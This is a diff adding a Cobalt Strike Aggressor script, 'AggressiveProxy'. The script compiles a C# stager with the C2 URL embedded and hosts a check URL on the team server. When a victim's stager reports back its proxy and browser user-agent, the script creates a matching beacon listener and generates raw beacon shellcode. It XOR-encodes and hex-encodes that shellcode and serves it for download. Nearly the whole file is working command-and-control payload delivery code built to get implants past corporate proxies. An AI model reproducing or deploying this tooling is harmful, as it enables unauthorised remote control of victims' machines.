@@ -1,0 +1,215 @@
+global('$selected_listener $proxy_handler_url');
+
+$msbuild = "/Library/Frameworks/Mono.framework/Versions/Current/Commands/msbuild";
+
+menubar("Proxy Handler", "proxy_handler");
+
+popup proxy_handler {
+	item "&Start Handler" {
+		start_handler();
+	}
+	item "&Stop Handler" {
+		stop_handler();
+	}
+	item "&Clean-up hosted content" {
+		clean_site_contents();
+	}
+}
+
+sub start_handler {
+	local('$dialog');
+	if($selected_listener) {
+		show_message("[AggressiveProxy] ERROR: Already started...");
+		exit();
+	}
+	$dialog = dialog("Proxy Handler Generation", %(listener => "", checkurl => "/proxy", responseContent => "ok"), &start_handler_Callback);
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_text($dialog, "checkurl", "Check URL: ");
+	drow_text($dialog, "responseContent", "Expected Response Content: ");
+	dbutton_action($dialog, "Start & Build binary");
+	dialog_show($dialog);
+}
+
+sub build_letmeout {
+	local('$url $responseContent $handle $data $destination $buildver $build');
+	$url = $1;
+	$responseContent = $2;
+	
+	println($url);
+	$handle = openf(script_resource("LetMeOutSharp/LetMeOutSharp/Program_template.cs"));
+	$data   = readb($handle, -1);
+	closef($handle);
+	
+	$data = strrep($data, "%C2URL%", $url);
+	$data = strrep($data, "%RESPONSE%", $responseContent);
+
+	$destination = openf(">".script_resource("LetMeOutSharp/LetMeOutSharp/Program.cs"));
+	writeb($destination,$data);
+	closef($destination);
+	$buildver = "Release"; # "Release" or "Debug"
+
+	println("[AggressiveProxy] INFO: Using msbuild: $msbuild");
+	$build = exec($msbuild . " -m -t:Rebuild -p:Configuration=" . $buildver . " -p:NoWarn=0168 " . script_resource("LetMeOutSharp/LetMeOutSharp.sln"));
+	wait($build);
+	# println(readAll($build)); # remove
+	closef($build);
+	println("[AggressiveProxy] INFO: The binary file should be located at: " . script_resource("LetMeOutSharp/LetMeOutSharp/bin/" . $buildver . "/letmeout.exe"));
+}
+
+sub start_handler_Callback {
+	local('%info $ssl $checkurl $responseContent');
+	if($selected_listener) {
+		show_message("[AggressiveProxy] ERROR: Already started...");
+		exit();
+	}
+
+	clean_site_contents();
+	println("[AggressiveProxy] INFO: Start serving...");
+	if ($3['listener'] eq "") {
+		show_message("[AggressiveProxy] ERROR: No listener specified!");
+		exit();
+	}
+
+	%info = listener_info($3['listener']); 
+
+	if(%info['payload'] ne "windows/beacon_http/reverse_http" && %info['payload'] ne "windows/beacon_https/reverse_https")
+	{
+		show_message("[AggressiveProxy] ERROR: Only HTTP and HTTPS beacons support a proxy");
+		elog("[AggressiveProxy] ERROR: Only HTTP and HTTPS beacons support a proxy");
+		println("[AggressiveProxy] ERROR: Only HTTP and HTTPS beacons support a proxy");
+		exit();
+	}
+
+	$selected_listener = copy(%info);
+	println("[AggressiveProxy] INFO: Base listener is: $selected_listener['name']");
+	
+	$selected_listener['name'] = 'agproxy';
+	$selected_listener['status'] = $null;
+	$ssl = false;
+	
+	if($selected_listener['payload'] eq "windows/beacon_https/reverse_https") {
+		println("[AggressiveProxy] INFO: Using HTTPS");
+		$ssl = true;
+	}
+
+	$checkurl = $3['checkurl'];
+	if(left($checkurl,1) ne "/") {
+		println("[AggressiveProxy] WARNING: Url needs to start with /. Adding /.");
+		$checkurl = "/" . $checkurl;
+	}
+	$responseContent = $3['responseContent'];
+
+	$proxy_handler_url = $checkurl;
+	$url = site_host($selected_listener['host'], $selected_listener['port'], $checkurl, $responseContent, "text/plain", "Proxy Shellcode Handler", $ssl);
+	build_letmeout($url, $responseContent);
+}
+
+sub stop_handler {
+	if($selected_listener) {
+		println("[AggressiveProxy] INFO: Stopping...");
+		clean_site_contents();
+		$selected_listener = $null;
+	}
+}
+
+sub clean_site_contents {
+	# Cleanup site contents
+	local('$type $key $value $description');
+	println("[AggressiveProxy] INFO: Cleaning site contents...");
+	foreach $key => $value (sites()){
+		$type = $value['Type'];
+		$description = $value['Description'];
+		if($type eq "page" && $description eq "Proxy Shellcode Handler") {
+			site_kill($value['Port'], $value['URI']);
+		}
+		if($type eq "page" && $description eq "Proxy enabled shellcode") {
+			site_kill($value['Port'], $value['URI']);
+		}
+	}
+}
+
+println("[AggressiveProxy] INFO: Serving you...");
+
+on web_hit {
+
+	local('$temp_listener_options $b64proxy $b64useragent $is64 $proxy $useragent $data $hexdata $payload $listener_name $arch $proxyshellcodeurl $variant');
+	
+	if($selected_listener) {
+		if ($2 eq $proxy_handler_url) {
+			println("[AggressiveProxy] INFO: Proxy handler URL: $proxy_handler_url");
+			println("[AggressiveProxy] INFO: Visit in the proxy handler URL from: $3");
+			$b64proxy = $8['a'];
+			$b64useragent = $8['b'];
+			$is64 = $8['c'];
+			$proxy = base64_decode($b64proxy);
+			$useragent = base64_decode($b64useragent);
+			$variant = "";
+			if($useragent eq "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36") {
+				# Chrome
+				$variant = "chrome";
+			} else if($useragent eq "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Edge/86.0.622.51") {
+				# Edge
+				$variant = "edge";
+			} else if($useragent eq "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0") {
+				# Firefox
+				$variant = "firefox";
+			} else {
+				# default
+				$variant = "default";
+			}
+			println("[AggressiveProxy] INFO: The proxy received is: $proxy");
+			println("[AggressiveProxy] INFO: User-agent: $useragent");
+			println("[AggressiveProxy] INFO: Variant to use: $variant");
+
+			$temp_listener_options = copy($selected_listener);
+			$temp_listener_options['name'] = $null;
+			$temp_listener_options['payload'] = $null;
+
+			if($proxy) {
+				if(right($proxy,1) eq "/")
+				{
+					$proxy = left($proxy,-1); #COBALT BUG with slash
+				}
+				$temp_listener_options['proxy'] = $proxy; 
+			} else {
+				println("[AggressiveProxy] INFO: Using direct connectivity")
+				$temp_listener_options['proxy'] = "*direct*";
+			}
+
+			$arch = "x64";
+			if($is64 eq "0") {
+				$arch = "x86";
+			}
+
+			$temp_listener_options['profile'] = $variant;
+			$proxyshellcodeurl = $b64proxy . base64_encode($variant) . base64_encode($arch);
+			$listener_name = "agproxy-rand" . rand(10000);
+
+			println("[AggressiveProxy] INFO: Using payload for: $selected_listener['payload']");
+			listener_create_ext($listener_name, $selected_listener['payload'], $temp_listener_options); # This will log a java.lang.RuntimeException: Another Beacon listener exists on your cobalt console
+			println("[AggressiveProxy] INFO: Started temp listener: $listener_name");
+			
+			when("listeners", lambda({
+				local('$data $xordata $hexdata $ssl');
+				println("[AggressiveProxy] INFO: Generating & hosting new payload \($listener_name - $arch\)");
+				$data = artifact_payload($listener_name, "raw", $arch);
+				$xordata  = str_xor($data, chr(42));
+				$hexdata = transform($xordata, "hex");
+				$ssl = false;
+				if($selected_listener['payload'] eq "windows/beacon_https/reverse_https") {
+					println("[AggressiveProxy] INFO: Using HTTPS");
+					$ssl = true;
+				}
+				println("[AggressiveProxy] INFO: Shellcode length: " . strlen($hexdata));
+				println("[AggressiveProxy] INFO: Hosting payload at: /$proxyshellcodeurl")
+				site_host($selected_listener['host'], $selected_listener['port'], "/$proxyshellcodeurl", "$hexdata", "text/plain", "Proxy enabled shellcode", $ssl);
+				listener_delete($listener_name);
+				
+
+			}, $proxyshellcodeurl => $proxyshellcodeurl, $listener_name => $listener_name, $arch => $arch)); 
+		}
+	} else {
+		elog("[AggressiveProxy] WARNING: Not started yet");
+		println("[AggressiveProxy] WARNING: Not started yet");
+	} 
+}
